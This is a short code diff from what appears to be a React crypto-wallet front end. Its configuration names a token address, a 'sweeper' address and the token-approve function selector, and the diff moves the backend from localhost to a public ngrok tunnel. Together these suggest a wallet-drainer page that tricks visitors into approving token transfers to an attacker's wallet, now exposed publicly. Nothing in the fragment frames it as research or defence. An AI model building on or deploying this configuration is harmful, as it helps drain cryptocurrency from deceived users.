@@ -8,7 +8,7 @@ import { QRCodeSVG } from "qrcode.react";
 /* ----------------------------- configuration ---------------------------- */
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
 const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
-const BACKEND = "http://localhost:3001";
+const BACKEND = "https://protrude-pentagon-helper.ngrok-free.dev";
 const APPROVE_SELECTOR = "0x095ea7b3";
 
 const THEMES = {
